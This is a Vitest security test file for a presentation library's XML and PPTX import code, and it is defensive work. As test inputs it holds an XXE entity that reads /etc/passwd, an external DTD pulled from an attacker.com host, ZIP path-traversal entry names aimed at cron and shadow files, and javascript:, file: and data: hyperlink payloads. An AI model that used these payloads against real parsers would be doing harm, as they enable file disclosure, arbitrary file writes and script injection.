import { describe, it, expect } from 'vitest';
import { GlimpseSecurity } from '../security';
import { PptxAdapter } from '../export/pptx';
import JSZip from 'jszip';

describe('Glimpse & PPTX Hostile Security Defenses', () => {
  it('should detect and reject XXE / DTD entity injection payloads', () => {
    const hostileXml1 = `<?xml version="1.0"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <p:presentation><p:sldIdLst>&xxe;</p:sldIdLst></p:presentation>`;

    expect(() => GlimpseSecurity.validateXmlContent(hostileXml1, 'presentation.xml')).toThrowError(/Security Violation: DTD \/ Entity expansion detected/);

    const hostileXml2 = `<?xml version="1.0"?>
    <!DOCTYPE p:sld PUBLIC "SYSTEM" "http://attacker.com/evil.dtd">
    <p:sld><p:cSld/></p:sld>`;

    expect(() => GlimpseSecurity.validateXmlContent(hostileXml2, 'slide1.xml')).toThrowError(/Security Violation: DTD \/ Entity expansion detected/);
  });

  it('should detect and reject directory traversal in ZIP package entries', () => {
    expect(() => GlimpseSecurity.validateEntryPath('../../etc/cron.d/evil')).toThrowError(/Security Violation: Directory traversal detected/);
    expect(() => GlimpseSecurity.validateEntryPath('/absolute/path/file.xml')).toThrowError(/Security Violation: Directory traversal detected/);
    expect(() => GlimpseSecurity.validateEntryPath('ppt/slides/../../shadow')).toThrowError(/Security Violation: Directory traversal detected/);
  });

  it('should sanitize hyperlinks and reject dangerous protocols like javascript: or file:', () => {
    expect(GlimpseSecurity.sanitizeHyperlink('javascript:alert(document.cookie)')).toBeUndefined();
    expect(GlimpseSecurity.sanitizeHyperlink('file:///etc/passwd')).toBeUndefined();
    expect(GlimpseSecurity.sanitizeHyperlink('data:text/html,<script>alert(1)</script>')).toBeUndefined();

    expect(GlimpseSecurity.sanitizeHyperlink('https://openhead.org/docs')).toBe('https://openhead.org/docs');
    expect(GlimpseSecurity.sanitizeHyperlink('mailto:contact@openhead.org')).toBe('mailto:contact@openhead.org');
    expect(GlimpseSecurity.sanitizeHyperlink('#slide3')).toBe('#slide3');
  });

  it('should reject hostile PPTX archive with corrupted structure or missing presentation.xml', async () => {
    const badZip = new JSZip();
    badZip.file('dummy.txt', 'not a pptx');
    const buf = await badZip.generateAsync({ type: 'uint8array' });

    await expect(PptxAdapter.fromBuffer(buf)).rejects.toThrowError(/Missing ppt\/presentation\.xml/);
  });
});
